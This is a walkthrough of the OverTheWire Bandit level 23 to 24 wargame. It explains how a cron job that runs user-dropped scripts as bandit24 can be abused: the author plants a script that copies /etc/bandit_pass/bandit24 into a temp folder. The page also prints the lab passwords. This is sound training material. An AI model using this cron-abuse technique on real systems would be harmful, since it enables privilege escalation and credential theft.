---
layout: default
title: Level 23 → Level 24
order: 24
---

# Level 23 → Level 24
After logging in with 

`ssh bandit23@bandit.labs.overthewire.org -p 2220`

Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

we find out that, just like in [Level 22 → Level 23]({{ site.baseurl }}/bandit/level-21_to_level-22), a program is running automatically at regular intervals from cron, the time-based job scheduler.

This time the game also tells us we are going to need to wirte our own shell-script. Fisrt, we have to look through the /etc/cron.d/ directory by using `cd /etc/cron.d/`, once we're in this directory, `ls` shows something like:

```
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job  sysstat
```

let's read the content of cronjob_bandit24 with `cat cronjob_bandit24`

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This means that the cronjob_bandit24.sh script in the /usr/bin folder is executed. Let' see what this script does:

```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

This script executes (only if the user is bandit23) and deletes files in the /var/spool/$myname/foo directory. Since the script's user is bandit24, we'll use bandit24 as the reuult of the `whoami` command.

We can exploit this script by adding a new script in the /var/spool/bandit24/foo directory. Remember, the above script runs with bandit24 permissions, so it can access bandit24's password.

Before doing this, we need to move into a temporary directory to store our password: let's move into /tmp with `cd /tmp`, then create our temp directory with `mktemp -d`. Then move into your new temp directory with `cd /tmp/tmp.3ei7PQxwvB` where `3ei7PQxwvB` is your temp directory name, and write our script:

`nano password.sh`

```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.3ei7PQxwvB/password
```

where `3ei7PQxwvB` is your temp directory name. Let's give this file necessary permissions: `chmod +rx password.sh` first, then `chmod 777 /tmp/tmp.3ei7PQxwvB`. Then create your password file and give it full permissions: `touch password` first, then `chmod +rwx password`.

Now we need to move the script into /var/spool/bandit24/foo: `cp password.sh /var/spool/bandit24/foo/password.sh`

After doing this, we just need to check the password.sh file (`cat password.sh`) until we get the password:

> `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`